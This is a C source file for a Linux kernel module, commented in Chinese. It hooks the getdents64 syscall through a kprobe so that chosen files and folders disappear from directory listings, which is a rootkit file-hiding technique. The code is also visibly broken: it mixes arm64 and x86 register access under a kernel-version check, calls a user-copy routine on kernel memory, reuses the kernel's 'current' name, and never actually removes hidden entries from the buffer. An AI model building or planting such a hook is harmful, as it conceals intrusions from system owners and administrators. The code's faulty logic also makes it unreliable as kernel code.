/*
 * vfs_hook.c - VFS 层 Hook 实现
 * 用于隐藏文件/文件夹
 * 兼容 Linux 5.10 - 6.12
 */

#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include <linux/fs.h>

#include "hook.h"

MODULE_LICENSE("GPL");

/* getdents64 原型 */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
typedef int (*getdents64_fn)(struct file *filp, struct linux_dirent64 __user *dirent,
                             unsigned int count);
#else
typedef int (*getdents64_fn)(struct file *filp, struct linux_dirent64 __user *dirent,
                             unsigned int count);
#endif

/* 保存原始函数指针 */
static getdents64_fn orig_getdents64;

/* getdents64 pre_handler */
static int pre_getdents64(struct kprobe *p, struct pt_regs *regs)
{
    /* 可以在这里添加预处理逻辑 */
    return 0;
}

/* 过滤目录条目中的隐藏文件 */
static int filter_entries(struct linux_dirent64 __user *dirent, int count)
{
    struct linux_dirent64 *kbuf, *current, *prev = NULL;
    int total = 0;
    int new_count = 0;
    char name[256];

    /* 分配内核缓冲区 */
    kbuf = kzalloc(count + 4096, GFP_KERNEL);
    if (!kbuf)
        return count; /* 失败时返回原始数据 */

    /* 复制用户数据到内核 */
    if (copy_from_user(kbuf, dirent, count)) {
        kfree(kbuf);
        return count;
    }

    current = kbuf;
    total = count;
    new_count = 0;
    prev = NULL;

    while (total > 0) {
        int reclen = current->d_reclen;

        if (reclen <= 0 || reclen > total)
            break;

        /* 获取文件名 */
        memset(name, 0, sizeof(name));
        strncpy_from_user(name, current->d_name,
                         min(reclen - offsetof(struct linux_dirent64, d_name),
                             (int)sizeof(name) - 1));

        /* 检查是否应该隐藏 */
        if (!is_hidden(name, false)) {
            /* 保留此条目 */
            prev = current;
            new_count += reclen;
        }
        /* 如果隐藏，则不增加 new_count，相当于移除 */

        total -= reclen;
        current = (struct linux_dirent64 *)((char *)current + reclen);
    }

    /* 复制过滤后的数据回用户空间 */
    if (new_count > 0 && new_count <= count) {
        if (copy_to_user(dirent, kbuf, new_count)) {
            new_count = -EFAULT;
        }
    }

    kfree(kbuf);
    return new_count > 0 ? new_count : count;
}

/* getdents64 post_handler */
static void post_getdents64(struct kprobe *p, struct pt_regs *regs,
                            unsigned long flags)
{
    /* 过滤目录条目 */
    struct linux_dirent64 __user *dirent;
    int count;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 4, 0)
    dirent = (struct linux_dirent64 __user *)regs->regs[1];
    count = (int)regs->regs[2];
#else
    dirent = (struct linux_dirent64 __user *)regs->si;
    count = (int)regs->dx;
#endif

    if (count <= 0)
        return;

    filter_entries(dirent, count);
}

/* Kprobe 定义 */
static struct kprobe kp_getdents64 = {
    .symbol_name = "sys_getdents64",
    .pre_handler = pre_getdents64,
    .post_handler = post_getdents64,
};

int vfs_hook_init(void)
{
    int ret;

    /* 注册 getdents64 kprobe */
    ret = register_kprobe(&kp_getdents64);
    if (ret < 0) {
        pr_err("hook: failed to register getdents64 kprobe: %d\n", ret);
        return ret;
    }

    pr_info("hook: vfs hook registered (getdents64)\n");
    return 0;
}

void vfs_hook_exit(void)
{
    unregister_kprobe(&kp_getdents64);
    pr_info("hook: vfs hook unregistered\n");
}
